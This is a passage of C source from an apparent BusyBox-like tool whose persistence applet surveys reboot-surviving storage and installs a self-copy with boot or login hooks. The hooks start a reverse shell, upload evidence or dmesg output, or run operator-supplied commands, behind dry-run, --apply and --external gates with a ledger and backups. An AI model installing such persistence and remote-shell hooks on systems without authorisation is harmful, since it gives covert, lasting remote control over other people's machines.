    fputs("},\"api_resources_by_records_key\":{", stdout);
    if (is_status) {
        fputs("\"installations\":[", stdout);
        recovery_print_api_resource_object("installations", installed_count, "summary.installation_count", "method", installation_indexes);
        fputs("]", stdout);
    } else {
        fputs("\"storage\":[", stdout);
        recovery_print_api_resource_object("storage", storage_count, "summary.storage_count", "path", storage_indexes);
        fputs("],\"methods\":[", stdout);
        recovery_print_api_resource_object("methods", method_count, "summary.method_count", "name", method_indexes);
        fputs("],\"actions\":[", stdout);
        recovery_print_api_resource_object("actions", action_count, "summary.action_count", "name", action_indexes);
        fputs("]", stdout);
    }
    fputs("},\"api_resources_by_summary_key\":{", stdout);
    if (is_status) {
        fputs("\"summary.installation_count\":[", stdout);
        recovery_print_api_resource_object("installations", installed_count, "summary.installation_count", "method", installation_indexes);
        fputs("]", stdout);
    } else {
        fputs("\"summary.storage_count\":[", stdout);
        recovery_print_api_resource_object("storage", storage_count, "summary.storage_count", "path", storage_indexes);
        fputs("],\"summary.method_count\":[", stdout);
        recovery_print_api_resource_object("methods", method_count, "summary.method_count", "name", method_indexes);
        fputs("],\"summary.action_count\":[", stdout);
        recovery_print_api_resource_object("actions", action_count, "summary.action_count", "name", action_indexes);
        fputs("]", stdout);
    }
    fputs("},\"api_resources_by_primary_key\":{", stdout);
    if (is_status) {
        fputs("\"method\":[", stdout);
        recovery_print_api_resource_object("installations", installed_count, "summary.installation_count", "method", installation_indexes);
        fputs("]", stdout);
    } else {
        fputs("\"path\":[", stdout);
        recovery_print_api_resource_object("storage", storage_count, "summary.storage_count", "path", storage_indexes);
        fputs("],\"name\":[", stdout);
        recovery_print_api_resource_object("methods", method_count, "summary.method_count", "name", method_indexes);
        fputc(',', stdout);
        recovery_print_api_resource_object("actions", action_count, "summary.action_count", "name", action_indexes);
        fputs("]", stdout);
    }
    fputs("}", stdout);
}

static int recovery_action_index_match(const char *field, const char *action, const char *value)
{
    const char *candidate = "";
    if (!strcmp(field, "name"))
        candidate = action;
    else if (!strcmp(field, "category"))
        candidate = recovery_action_category(action);
    else if (!strcmp(field, "uploads_evidence"))
        candidate = recovery_action_uploads_evidence(action) ? "yes" : "no";
    else if (!strcmp(field, "collects_dmesg"))
        candidate = recovery_action_collects_dmesg(action) ? "yes" : "no";
    else if (!strcmp(field, "starts_rshell"))
        candidate = recovery_action_starts_rshell(action) ? "yes" : "no";
    else if (!strcmp(field, "starts_rshell_after_evidence"))
        candidate = recovery_action_starts_rshell_after_evidence(action) ? "yes" : "no";
    else if (!strcmp(field, "executes_operator_supplied_command"))
        candidate = recovery_action_executes_operator_supplied_command(action) ? "yes" : "no";
    else if (!strcmp(field, "command_queue_enabled"))
        candidate = "no";
    else if (!strcmp(field, "hidden_control_channel"))
        candidate = "no";
    else if (!strcmp(field, "requires_explicit_apply"))
        candidate = "yes";
    else if (!strcmp(field, "requires_external_write"))
        candidate = "yes";
    return !strcmp(candidate, value);
}

static void recovery_print_action_index_array(const char *field, const char *value)
{
    size_t i;
    int first = 1;
    fputc('[', stdout);
    for (i = 0; recovery_actions[i]; i++) {
        if (!recovery_action_index_match(field, recovery_actions[i], value))
            continue;
        printf("%s%zu", first ? "" : ",", i);
        first = 0;
    }
    fputc(']', stdout);
}

static void recovery_print_survey_index_array(const char *collection, const char *field, const char *value)
{
    size_t i;
    int first = 1;

    fputc('[', stdout);
    if (!strcmp(collection, "storage")) {
        for (i = 0; i < sizeof(recovery_storage_paths) / sizeof(recovery_storage_paths[0]); i++) {
            const char *candidate = "";
            if (!strcmp(field, "class"))
                candidate = recovery_storage_paths[i].class_name;
            else if (!strcmp(field, "survives_reboot"))
                candidate = recovery_storage_paths[i].survives_reboot;
            if (strcmp(candidate, value))
                continue;
            printf("%s%zu", first ? "" : ",", i);
            first = 0;
        }
    } else if (!strcmp(collection, "methods")) {
        for (i = 0; i < sizeof(recovery_methods) / sizeof(recovery_methods[0]); i++) {
            const char *candidate = "";
            if (!strcmp(field, "name"))
                candidate = recovery_methods[i].name;
            else if (!strcmp(field, "survives_reboot"))
                candidate = recovery_methods[i].survives_reboot;
            else if (!strcmp(field, "intrusiveness"))
                candidate = recovery_methods[i].intrusiveness;
            else if (!strcmp(field, "requires_external_write"))
                candidate = recovery_methods[i].requires_external_write;
            if (strcmp(candidate, value))
                continue;
            printf("%s%zu", first ? "" : ",", i);
            first = 0;
        }
    }
    fputc(']', stdout);
}

static void recovery_print_survey_indexes(void)
{
    static const char *storage_classes[] = {"persistent", "volatile", "usually-volatile", NULL};
    static const char *storage_survives[] = {"yes", "no", "maybe", NULL};
    static const char *method_survives[] = {"yes", "event", "login-only", "maybe", NULL};
    static const char *method_intrusiveness[] = {"low", "medium", "high", NULL};
    static const char *method_external_write[] = {"yes", "no", NULL};
    static const char *action_categories[] = {"status", "reverse-shell", "evidence", "command", "script", NULL};
    static const char *yes_no[] = {"yes", "no", NULL};
    size_t i;

    fputs(",\"storage_by_class\":{", stdout);
    for (i = 0; storage_classes[i]; i++) {
        if (i)
            fputc(',', stdout);
        bb_json_string(stdout, storage_classes[i]);
        fputc(':', stdout);
        recovery_print_survey_index_array("storage", "class", storage_classes[i]);
    }
    fputs("},\"storage_by_survives_reboot\":{", stdout);
    for (i = 0; storage_survives[i]; i++) {
        if (i)
            fputc(',', stdout);
        bb_json_string(stdout, storage_survives[i]);
        fputc(':', stdout);
        recovery_print_survey_index_array("storage", "survives_reboot", storage_survives[i]);
    }
    fputs("},\"methods_by_name\":{", stdout);
    for (i = 0; i < sizeof(recovery_methods) / sizeof(recovery_methods[0]); i++) {
        if (i)
            fputc(',', stdout);
        bb_json_string(stdout, recovery_methods[i].name);
        fputc(':', stdout);
        recovery_print_survey_index_array("methods", "name", recovery_methods[i].name);
    }
    fputs("},\"methods_by_survives_reboot\":{", stdout);
    for (i = 0; method_survives[i]; i++) {
        if (i)
            fputc(',', stdout);
        bb_json_string(stdout, method_survives[i]);
        fputc(':', stdout);
        recovery_print_survey_index_array("methods", "survives_reboot", method_survives[i]);
    }
    fputs("},\"methods_by_intrusiveness\":{", stdout);
    for (i = 0; method_intrusiveness[i]; i++) {
        if (i)
            fputc(',', stdout);
        bb_json_string(stdout, method_intrusiveness[i]);
        fputc(':', stdout);
        recovery_print_survey_index_array("methods", "intrusiveness", method_intrusiveness[i]);
    }
    fputs("},\"methods_by_requires_external_write\":{", stdout);
    for (i = 0; method_external_write[i]; i++) {
        if (i)
            fputc(',', stdout);
        bb_json_string(stdout, method_external_write[i]);
        fputc(':', stdout);
        recovery_print_survey_index_array("methods", "requires_external_write", method_external_write[i]);
    }
    fputs("},\"actions_by_name\":{", stdout);
    for (i = 0; recovery_actions[i]; i++) {
        if (i)
            fputc(',', stdout);
        bb_json_string(stdout, recovery_actions[i]);
        fputc(':', stdout);
        recovery_print_action_index_array("name", recovery_actions[i]);
    }
    fputs("},\"actions_by_category\":{", stdout);
    for (i = 0; action_categories[i]; i++) {
        if (i)
            fputc(',', stdout);
        bb_json_string(stdout, action_categories[i]);
        fputc(':', stdout);
        recovery_print_action_index_array("category", action_categories[i]);
    }
    fputs("},\"actions_by_uploads_evidence\":{", stdout);
    for (i = 0; yes_no[i]; i++) {
        if (i)
            fputc(',', stdout);
        bb_json_string(stdout, yes_no[i]);
        fputc(':', stdout);
        recovery_print_action_index_array("uploads_evidence", yes_no[i]);
    }
    fputs("},\"actions_by_collects_dmesg\":{", stdout);
    for (i = 0; yes_no[i]; i++) {
        if (i)
            fputc(',', stdout);
        bb_json_string(stdout, yes_no[i]);
        fputc(':', stdout);
        recovery_print_action_index_array("collects_dmesg", yes_no[i]);
    }
    fputs("},\"actions_by_starts_rshell\":{", stdout);
    for (i = 0; yes_no[i]; i++) {
        if (i)
            fputc(',', stdout);
        bb_json_string(stdout, yes_no[i]);
        fputc(':', stdout);
        recovery_print_action_index_array("starts_rshell", yes_no[i]);
    }
    fputs("},\"actions_by_starts_rshell_after_evidence\":{", stdout);
    for (i = 0; yes_no[i]; i++) {
        if (i)
            fputc(',', stdout);
        bb_json_string(stdout, yes_no[i]);
        fputc(':', stdout);
        recovery_print_action_index_array("starts_rshell_after_evidence", yes_no[i]);
    }
    fputs("},\"actions_by_executes_operator_supplied_command\":{", stdout);
    for (i = 0; yes_no[i]; i++) {
        if (i)
            fputc(',', stdout);
        bb_json_string(stdout, yes_no[i]);
        fputc(':', stdout);
        recovery_print_action_index_array("executes_operator_supplied_command", yes_no[i]);
    }
    fputs("},\"actions_by_command_queue_enabled\":{", stdout);
    for (i = 0; yes_no[i]; i++) {
        if (i)
            fputc(',', stdout);
        bb_json_string(stdout, yes_no[i]);
        fputc(':', stdout);
        recovery_print_action_index_array("command_queue_enabled", yes_no[i]);
    }
    fputs("},\"actions_by_hidden_control_channel\":{", stdout);
    for (i = 0; yes_no[i]; i++) {
        if (i)
            fputc(',', stdout);
        bb_json_string(stdout, yes_no[i]);
        fputc(':', stdout);
        recovery_print_action_index_array("hidden_control_channel", yes_no[i]);
    }
    fputs("},\"actions_by_requires_explicit_apply\":{", stdout);
    for (i = 0; yes_no[i]; i++) {
        if (i)
            fputc(',', stdout);
        bb_json_string(stdout, yes_no[i]);
        fputc(':', stdout);
        recovery_print_action_index_array("requires_explicit_apply", yes_no[i]);
    }
    fputs("},\"actions_by_requires_external_write\":{", stdout);
    for (i = 0; yes_no[i]; i++) {
        if (i)
            fputc(',', stdout);
        bb_json_string(stdout, yes_no[i]);
        fputc(':', stdout);
        recovery_print_action_index_array("requires_external_write", yes_no[i]);
    }
    fputs("}", stdout);
}

static void recovery_print_survey_api_collections(void)
{
    fputs(",\"api_collections\":{", stdout);
    printf("\"storage\":{\"name\":\"storage\",\"count\":%zu,\"count_summary_key\":\"summary.storage_count\",\"primary_key\":\"path\",\"summary_key\":\"summary.storage_count\",\"indexes\":[",
           sizeof(recovery_storage_paths) / sizeof(recovery_storage_paths[0]));
    fputs("\"storage_by_class\",\"storage_by_survives_reboot\"", stdout);
    printf("]},\"methods\":{\"name\":\"methods\",\"count\":%zu,\"count_summary_key\":\"summary.method_count\",\"primary_key\":\"name\",\"summary_key\":\"summary.method_count\",\"indexes\":[",
           sizeof(recovery_methods) / sizeof(recovery_methods[0]));
    fputs("\"methods_by_name\",\"methods_by_survives_reboot\",\"methods_by_intrusiveness\",\"methods_by_requires_external_write\"", stdout);
    printf("]},\"actions\":{\"name\":\"actions\",\"count\":%zu,\"count_summary_key\":\"summary.action_count\",\"primary_key\":\"name\",\"summary_key\":\"summary.action_count\",\"indexes\":[",
           (sizeof(recovery_actions) / sizeof(recovery_actions[0])) - 1);
    fputs("\"actions_by_name\",\"actions_by_category\",\"actions_by_uploads_evidence\",\"actions_by_collects_dmesg\",\"actions_by_starts_rshell\",\"actions_by_starts_rshell_after_evidence\",\"actions_by_executes_operator_supplied_command\",\"actions_by_command_queue_enabled\",\"actions_by_hidden_control_channel\",\"actions_by_requires_explicit_apply\",\"actions_by_requires_external_write\"", stdout);
    fputs("]}}", stdout);
}

static void recovery_print_survey(int json, const char *root, const char *mode)
{
    size_t i;
    if (json) {
        int is_plan = mode && !strcmp(mode, "plan");
        fputs("{\"schema\":1,\"mode\":", stdout);
        bb_json_string(stdout, is_plan ? "plan" : "survey");
        fputs(",\"root\":", stdout);
        bb_json_string(stdout, root);
        if (is_plan) {
            fputs(",\"target_modified\":false,\"plan\":{\"target_modified\":false,\"requires_method\":true,\"requires_apply_for_changes\":true,\"real_root_requires_external_apply\":true,\"recommendation\":\"choose one explicit method, run install --dry-run, then install --apply only when authorized\",\"next_steps\":[", stdout);
            bb_json_string(stdout, "choose one explicit method");
            fputs(",", stdout);
            bb_json_string(stdout, "run install --dry-run");
            fputs(",", stdout);
            bb_json_string(stdout, "run install --apply only when authorized");
            fputs("]}", stdout);
        }
        fputs(",\"storage\":[", stdout);
        for (i = 0; i < sizeof(recovery_storage_paths) / sizeof(recovery_storage_paths[0]); i++) {
            char path[PATH_MAX];
            recovery_join(path, sizeof(path), root, recovery_storage_paths[i].path + 1);
            printf("%s{\"path\":", i ? "," : "");
            bb_json_string(stdout, path);
            fputs(",\"class\":", stdout); bb_json_string(stdout, recovery_storage_paths[i].class_name);
            fputs(",\"survives_reboot\":", stdout); bb_json_string(stdout, recovery_storage_paths[i].survives_reboot);
            printf(",\"present\":%s,\"writable\":%s", path_exists(path) ? "true" : "false", access(path, W_OK) == 0 ? "true" : "false");
            fputs(",\"notes\":", stdout); bb_json_string(stdout, recovery_storage_paths[i].notes);
            fputc('}', stdout);
        }
        fputs("],\"methods\":[", stdout);
        for (i = 0; i < sizeof(recovery_methods) / sizeof(recovery_methods[0]); i++) {
            char path[PATH_MAX];
            recovery_join(path, sizeof(path), root, recovery_methods[i].path);
            printf("%s{\"name\":", i ? "," : "");
            bb_json_string(stdout, recovery_methods[i].name);
            fputs(",\"kind\":", stdout); bb_json_string(stdout, recovery_methods[i].kind);
            fputs(",\"path\":", stdout); bb_json_string(stdout, path);
            printf(",\"present\":%s", path_exists(path) ? "true" : "false");
            fputs(",\"survives_reboot\":", stdout); bb_json_string(stdout, recovery_methods[i].survives_reboot);
            fputs(",\"intrusiveness\":", stdout); bb_json_string(stdout, recovery_methods[i].intrusiveness);
            fputs(",\"reversibility\":", stdout); bb_json_string(stdout, recovery_methods[i].reversibility);
            fputs(",\"requires_external_write\":", stdout); bb_json_string(stdout, recovery_methods[i].requires_external_write);
            fputc('}', stdout);
        }
        fputs("],\"actions\":[", stdout);
        for (i = 0; recovery_actions[i]; i++) {
            const char *action = recovery_actions[i];
            printf("%s{\"name\":", i ? "," : "");
            bb_json_string(stdout, action);
            fputs(",\"category\":", stdout); bb_json_string(stdout, recovery_action_category(action));
            fputs(",\"uploads_evidence\":", stdout); fputs(recovery_action_uploads_evidence(action) ? "true" : "false", stdout);
            fputs(",\"collects_dmesg\":", stdout); fputs(recovery_action_collects_dmesg(action) ? "true" : "false", stdout);
            fputs(",\"starts_rshell\":", stdout); fputs(recovery_action_starts_rshell(action) ? "true" : "false", stdout);
            fputs(",\"starts_rshell_after_evidence\":", stdout); fputs(recovery_action_starts_rshell_after_evidence(action) ? "true" : "false", stdout);
            fputs(",\"executes_operator_supplied_command\":", stdout); fputs(recovery_action_executes_operator_supplied_command(action) ? "true" : "false", stdout);
            fputs(",\"command_queue_enabled\":false", stdout);
            fputs(",\"hidden_control_channel\":false", stdout);
            fputs(",\"requires_explicit_apply\":true", stdout);
            fputs(",\"requires_external_write\":true", stdout);
            fputs(",\"self_reinstall\":false", stdout);
            fputs(",\"survives_factory_reset_claim\":false", stdout);
            fputc('}', stdout);
        }
        fputs("]", stdout);
        recovery_print_survey_indexes();
        recovery_print_api_resources(
            (int)(sizeof(recovery_storage_paths) / sizeof(recovery_storage_paths[0])),
            (int)(sizeof(recovery_methods) / sizeof(recovery_methods[0])),
            (int)((sizeof(recovery_actions) / sizeof(recovery_actions[0])) - 1),
            -1);
        recovery_print_survey_api_collections();
        printf(",\"summary\":{\"storage_count\":%zu,\"method_count\":%zu,\"action_count\":%zu,\"evidence_action_count\":3,\"dmesg_action_count\":1,\"rshell_action_count\":2,\"operator_supplied_action_count\":2,\"command_queue_enabled_action_count\":0,\"hidden_control_channel_action_count\":0}}\n",
               sizeof(recovery_storage_paths) / sizeof(recovery_storage_paths[0]),
               sizeof(recovery_methods) / sizeof(recovery_methods[0]),
               (sizeof(recovery_actions) / sizeof(recovery_actions[0])) - 1);
        return;
    }
    puts("Persistence survey");
    printf("  root: %s\n\n", root);
    puts("Safety policy");
    puts("  survey/plan: no target modification");
    puts("  install: requires --method and --apply");
    puts("  real-root writes: require --external --apply");
    puts("  intrusive operations: marked in the method table");
    puts("");
    puts("Storage candidates");
    printf("  %-18s %-17s %-7s %-8s %-8s %s\n",
           "Path", "Class", "Present", "Writable", "Survives", "Notes");
    for (i = 0; i < sizeof(recovery_storage_paths) / sizeof(recovery_storage_paths[0]); i++) {
        char path[PATH_MAX];
        recovery_join(path, sizeof(path), root, recovery_storage_paths[i].path + 1);
        printf("  %-18s %-17s %-7s %-8s %-8s %s\n",
               path, recovery_storage_paths[i].class_name, path_exists(path) ? "yes" : "no",
               access(path, W_OK) == 0 ? "yes" : "no", recovery_storage_paths[i].survives_reboot,
               recovery_storage_paths[i].notes);
    }
    puts("");
    puts("Persistence methods");
    printf("  %-15s %-44s %-7s %-9s %s\n",
           "Method", "Path", "Present", "Intrusive", "Reversible");
    for (i = 0; i < sizeof(recovery_methods) / sizeof(recovery_methods[0]); i++) {
        char path[PATH_MAX];
        recovery_join(path, sizeof(path), root, recovery_methods[i].path);
        printf("  %-15s %-44s %-7s %-9s %s\n",
               recovery_methods[i].name, path, path_exists(path) ? "yes" : "no",
               recovery_methods[i].intrusiveness,
               recovery_methods[i].reversibility);
    }
}

static int applet_recovery_install(int argc, char **argv, int uninstall, const char *applet)
{
    const char *root = "/";
    const char *method = NULL;
    const char *action = "status-only";
    const char *name = BB_RECOVERY_BINARY_NAME;
    const char *script_file = NULL;
    const char *target_id_arg = NULL;
    const char *target_label_arg = NULL;
    const char *target_alias_args[16];
    int dry_run = 0, apply = 0, external = 0, json = 0;
    const struct recovery_method *m;
    char hook[PATH_MAX], bin[PATH_MAX], script_dst[PATH_MAX], bindir[PATH_MAX], backup[PATH_MAX];
    char generated[PATH_MAX * 2];
    char target_id[256], target_label[256], target_alias[256], upload_target_args[2048];
    int backup_status;
    int i, target_alias_count = 0;

    generated[0] = '\0';
    for (i = 2; i < argc; i++) {
        if (!strcmp(argv[i], "--dry-run"))
            dry_run = 1;
        else if (!strcmp(argv[i], "--apply"))
            apply = 1;
        else if (!strcmp(argv[i], "--external"))
            external = 1;
        else if (!strcmp(argv[i], "--json"))
            json = 1;
        else if (!strcmp(argv[i], "--root") && i + 1 < argc)
            root = argv[++i];
        else if (!strcmp(argv[i], "--method") && i + 1 < argc)
            method = argv[++i];
        else if (!strcmp(argv[i], "--action") && i + 1 < argc)
            action = argv[++i];
        else if (!strcmp(argv[i], "--name") && i + 1 < argc)
            name = argv[++i];
        else if (!strcmp(argv[i], "--file") && i + 1 < argc)
            script_file = argv[++i];
        else if (!strcmp(argv[i], "--target-id") && i + 1 < argc)
            target_id_arg = argv[++i];
        else if (!strcmp(argv[i], "--target-label") && i + 1 < argc)
            target_label_arg = argv[++i];
        else if (!strcmp(argv[i], "--target-alias") && i + 1 < argc) {
            if (target_alias_count >= (int)(sizeof(target_alias_args) / sizeof(target_alias_args[0]))) {
                fprintf(stderr, "%s: too many --target-alias values\n", applet);
                return 2;
            }
            target_alias_args[target_alias_count++] = argv[++i];
        }
        else if (!strcmp(argv[i], "--")) {
            int j;
            generated[0] = '\0';
            for (j = i + 1; j < argc; j++) {
                if (generated[0])
                    strncat(generated, " ", sizeof(generated) - strlen(generated) - 1);
                strncat(generated, argv[j], sizeof(generated) - strlen(generated) - 1);
            }
            break;
        }
        else {
            fprintf(stderr, "%s: unknown or incomplete option %s\n", applet, argv[i]);
            return 2;
        }
    }
    if (!method) {
        fprintf(stderr, "%s: install/uninstall requires --method\n", applet);
        return 2;
    }
    m = find_recovery_method(method);
    if (!m) {
        fprintf(stderr, "%s: unsupported method %s\n", applet, method);
        return 2;
    }
    if (strcmp(action, "rshell") && strcmp(action, "command") && strcmp(action, "script") &&
        strcmp(action, "status-only") && strcmp(action, "evidence-push") &&
        strcmp(action, "evidence-then-rshell") && strcmp(action, "dmesg-push")) {
        fprintf(stderr, "%s: unsupported recovery action %s\n", applet, action);
        return 2;
    }
    if (!shell_name_safe(name)) {
        fprintf(stderr, "%s: recovery name must use letters, numbers, dot, dash, or underscore\n", applet);
        return 2;
    }
    recovery_join(hook, sizeof(hook), root, m->path);
    recovery_bin_path(bin, sizeof(bin), root, name);
    recovery_script_path(script_dst, sizeof(script_dst), root, name);
    clean_recovery_arg_value(target_id_arg ? target_id_arg : first_nonempty_env("BB_TARGET_ID", "BUSIERBOX_TARGET_ID"),
                             target_id, sizeof(target_id));
    clean_recovery_arg_value(target_label_arg ? target_label_arg : first_nonempty_env("BB_TARGET_LABEL", "BUSIERBOX_TARGET_LABEL"),
                             target_label, sizeof(target_label));
    upload_target_args[0] = '\0';
    if (append_upload_target_arg(upload_target_args, sizeof(upload_target_args), "--target-id", target_id) != 0 ||
        append_upload_target_arg(upload_target_args, sizeof(upload_target_args), "--target-label", target_label) != 0) {
        fprintf(stderr, "%s: target identity arguments are too long\n", applet);
        return 2;
    }
    for (i = 0; i < target_alias_count; i++) {
        clean_recovery_arg_value(target_alias_args[i], target_alias, sizeof(target_alias));
        if (append_upload_target_arg(upload_target_args, sizeof(upload_target_args), "--target-alias", target_alias) != 0) {
            fprintf(stderr, "%s: target alias arguments are too long\n", applet);
            return 2;
        }
    }
    if (!strcmp(action, "rshell"))
        snprintf(generated, sizeof(generated), "/usr/bin/%s rshell start", name);
    else if (!strcmp(action, "evidence-push"))
        snprintf(generated, sizeof(generated), "/usr/bin/%s evidence push%s --quiet", name, upload_target_args);
    else if (!strcmp(action, "evidence-then-rshell"))
        snprintf(generated, sizeof(generated), "/usr/bin/%s evidence push%s --quiet && /usr/bin/%s rshell start", name, upload_target_args, name);
    else if (!strcmp(action, "dmesg-push"))
        snprintf(generated, sizeof(generated), "bbx_dmesg_dir=%s/run; mkdir -p \"$bbx_dmesg_dir\" 2>/dev/null || bbx_dmesg_dir=.; bbx_dmesg=\"$bbx_dmesg_dir/%s-dmesg.txt\"; dmesg >\"$bbx_dmesg\" 2>&1; /usr/bin/%s evidence push \"$bbx_dmesg\"%s --dest %s-dmesg.txt --quiet; rm -f \"$bbx_dmesg\"", BB_RUNTIME_ROOT, name, name, upload_target_args, name);
    else if (!strcmp(action, "script")) {
        if (!script_file || !*script_file) {
            fprintf(stderr, "%s: recovery action script requires --file FILE\n", applet);
            return 2;
        }
        snprintf(generated, sizeof(generated), "/usr/bin/%s.recovery.sh", name);
    } else if (!strcmp(action, "command")) {
        if (!generated[0]) {
            fprintf(stderr, "%s: recovery action command requires -- COMMAND\n", applet);
            return 2;
        }
    } else {
        snprintf(generated, sizeof(generated), "/usr/bin/%s persistence status", name);
    }
    snprintf(bindir, sizeof(bindir), "%s", bin);
    {
        char *slash = strrchr(bindir, '/');
        if (slash)
            *slash = '\0';
    }
    if (!dry_run && !apply) {
        fprintf(stderr, "%s: modifying actions require --apply; use --dry-run to preview\n", applet);
        return 2;
    }
    if (!strcmp(root, "/") && apply && !external) {
        fprintf(stderr, "%s: real-root install/uninstall requires --external --apply\n", applet);
        return 2;
    }
    if (dry_run) {
        if (json) {
            printf("{\"schema\":1,\"mode\":\"dry-run\",\"operation\":");
            bb_json_string(stdout, uninstall ? "uninstall" : "install");
            fputs(",\"target_modified\":false,\"dry_run\":true,\"apply\":false,\"external\":", stdout);
            fputs(external ? "true" : "false", stdout);
            fputs(",\"root\":", stdout); bb_json_string(stdout, root);
            fputs(",\"real_root\":", stdout); fputs(!strcmp(root, "/") ? "true" : "false", stdout);
            fputs(",\"method\":", stdout); bb_json_string(stdout, method);
            fputs(",\"normalized_method\":", stdout); bb_json_string(stdout, m->name);
            fputs(",\"name\":", stdout); bb_json_string(stdout, name);
            fputs(",\"action\":", stdout); bb_json_string(stdout, action);
            fputs(",\"action_category\":", stdout); bb_json_string(stdout, recovery_action_category(action));
            fputs(",\"generated_command\":", stdout); bb_json_string(stdout, generated);
            fputs(",\"target_identity\":{\"target_id\":", stdout); bb_json_string(stdout, target_id);
            fputs(",\"target_label\":", stdout); bb_json_string(stdout, target_label);
            fputs(",\"target_aliases\":[", stdout);
            for (i = 0; i < target_alias_count; i++) {
                clean_recovery_arg_value(target_alias_args[i], target_alias, sizeof(target_alias));
                if (i)
                    fputc(',', stdout);
                bb_json_string(stdout, target_alias);
            }
            fputs("],\"source\":", stdout);
            bb_json_string(stdout, (target_id_arg || target_label_arg || target_alias_count) ? "arguments" :
                           (target_id[0] || target_label[0]) ? "environment" : "none");
            fputs("}", stdout);
            fputs(",\"paths\":{\"hook\":", stdout); bb_json_string(stdout, hook);
            fputs(",\"binary\":", stdout); bb_json_string(stdout, bin);
            fputs(",\"script\":", stdout); bb_json_string(stdout, script_dst);
            fputs("}", stdout);
            fputs(",\"would\":{\"copy_binary\":", stdout); fputs(uninstall ? "false" : "true", stdout);
            fputs(",\"copy_script\":", stdout); fputs(!uninstall && !strcmp(action, "script") ? "true" : "false", stdout);
            fputs(",\"write_hook\":", stdout); fputs(uninstall ? "false" : "true", stdout);
            fputs(",\"remove_marked_hook\":", stdout); fputs(uninstall ? "true" : "false", stdout);
            fputs(",\"remove_binary\":", stdout); fputs(uninstall ? "true" : "false", stdout);
            fputs(",\"remove_script\":", stdout); fputs(uninstall ? "true" : "false", stdout);
            fputs(",\"backup_existing_hook\":", stdout); fputs(!uninstall && path_exists(hook) ? "true" : "false", stdout);
            fputs("}", stdout);
            fputs(",\"action_semantics\":{\"uploads_evidence\":", stdout); fputs(recovery_action_uploads_evidence(action) ? "true" : "false", stdout);
            fputs(",\"collects_dmesg\":", stdout); fputs(recovery_action_collects_dmesg(action) ? "true" : "false", stdout);
            fputs(",\"starts_rshell\":", stdout); fputs(recovery_action_starts_rshell(action) ? "true" : "false", stdout);
            fputs(",\"starts_rshell_after_evidence\":", stdout); fputs(recovery_action_starts_rshell_after_evidence(action) ? "true" : "false", stdout);
            fputs(",\"executes_operator_supplied_command\":", stdout); fputs(recovery_action_executes_operator_supplied_command(action) ? "true" : "false", stdout);
            fputs(",\"command_queue_enabled\":false,\"hidden_control_channel\":false}", stdout);
            fputs(",\"safety\":{\"requires_apply\":true,\"requires_external_write\":", stdout);
            fputs(!strcmp(m->requires_external_write, "yes") ? "true" : "false", stdout);
            fputs(",\"external_write_authorized\":", stdout); fputs(external ? "true" : "false", stdout);
            fputs(",\"visible_marked_hooks\":true,\"uninstall_removes_marked_blocks\":true,\"self_reinstall\":false,\"survives_factory_reset_claim\":false}", stdout);
            fputs("}\n", stdout);
            return 0;
        }
        printf("Would %s persistence method=%s name=%s root=%s\n", uninstall ? "uninstall" : "install", method, name, root);
        printf("Action: %s\n", action);
        printf("Generated command: %s\n", generated);
        if (target_id[0] || target_label[0] || target_alias_count) {
            printf("Target identity: id=%s label=%s aliases=%d\n",
                   target_id[0] ? target_id : "-", target_label[0] ? target_label : "-",
                   target_alias_count);
        }
        printf("Would %s binary: %s\n", uninstall ? "remove" : "copy self to", bin);
        if (!strcmp(action, "script"))
            printf("Would %s script: %s from %s\n", uninstall ? "remove" : "copy", script_dst, script_file);
        printf("Would %s hook: %s\n", uninstall ? "remove marked block/file" : "write marked hook", hook);
        if (!uninstall && path_exists(hook))
            printf("Would backup existing hook before modification: %s.busierbox.bak.<timestamp>\n", hook);
        return 0;
    }
    if (uninstall) {
        bb_ledger_record("remove", hook, !strcmp(root, "/") ? "external" : "recovery-fakeroot", "recovery uninstall hook");
        bb_ledger_record("remove", bin, !strcmp(root, "/") ? "external" : "recovery-fakeroot", "recovery uninstall binary");
        bb_ledger_record("remove", script_dst, !strcmp(root, "/") ? "external" : "recovery-fakeroot", "recovery uninstall script");
        remove_recovery_block(hook, name);
        unlink(bin);
        unlink(script_dst);
        printf("%s: uninstalled method=%s name=%s\n", applet, method, name);
        return 0;
    }
    if (bb_mkdir_p(bindir, 0755) != 0) {
        fprintf(stderr, "%s: cannot create %s: %s\n", applet, bindir, strerror(errno));
        return 1;
    }
    if (copy_self_to(bin, argc > 0 ? argv[0] : NULL) != 0) {
        fprintf(stderr, "%s: cannot copy binary to %s: %s\n", applet, bin, strerror(errno));
        return 1;
    }
    if (!strcmp(action, "script")) {
        if (copy_file_path(script_file, script_dst) != 0) {
            fprintf(stderr, "%s: cannot copy script %s to %s: %s\n", applet, script_file, script_dst, strerror(errno));
            return 1;
        }
        chmod(script_dst, 0755);
    }
    {
        char hookdir[PATH_MAX];
        char *slash;
        snprintf(hookdir, sizeof(hookdir), "%s", hook);
        slash = strrchr(hookdir, '/');
        if (slash) {
            *slash = '\0';
            bb_mkdir_p(hookdir, 0755);
        }
    }
    backup[0] = '\0';
    if (remove_recovery_block(hook, name) != 0) {
        fprintf(stderr, "%s: cannot replace existing hook block in %s: %s\n", applet, hook, strerror(errno));
        return 1;
    }
    backup_status = backup_existing_file(hook, backup, sizeof(backup));
    if (backup_status < 0) {
        fprintf(stderr, "%s: cannot backup hook %s: %s\n", applet, hook, strerror(errno));
        return 1;
    }
    if (backup_status > 0)
        bb_ledger_record("backup", backup, !strcmp(root, "/") ? "external" : "recovery-fakeroot", hook);
    if (append_recovery_block(hook, method, name, action, generated) != 0) {
        fprintf(stderr, "%s: cannot write hook %s: %s\n", applet, hook, strerror(errno));
        return 1;
    }
    chmod(hook, 0755);
    {
        char detail[PATH_MAX * 2];
        snprintf(detail, sizeof(detail), "recovery binary method=%s action=%s name=%s", m->name, action, name);
        bb_ledger_record("write", bin, !strcmp(root, "/") ? "external" : "recovery-fakeroot", detail);
        if (!strcmp(action, "script")) {
            snprintf(detail, sizeof(detail), "recovery script method=%s action=%s name=%s source=%s", m->name, action, name, script_file);
            bb_ledger_record("write", script_dst, !strcmp(root, "/") ? "external" : "recovery-fakeroot", detail);
        }
        snprintf(detail, sizeof(detail), "recovery marked hook method=%s action=%s name=%s command=%s backup=%s", m->name, action, name, generated, backup_status > 0 ? backup : "none");
        bb_ledger_record("modify", hook, !strcmp(root, "/") ? "external" : "recovery-fakeroot", detail);
    }
    printf("%s: installed method=%s name=%s action=%s\n", applet, method, name, action);
    return 0;
}

int applet_recovery_main(int argc, char **argv)
{
    const char *cmd = argc > 1 ? argv[1] : "--help";
    const char *applet = payload_base_name(argc > 0 ? argv[0] : "persistence");
    const char *root = "/";
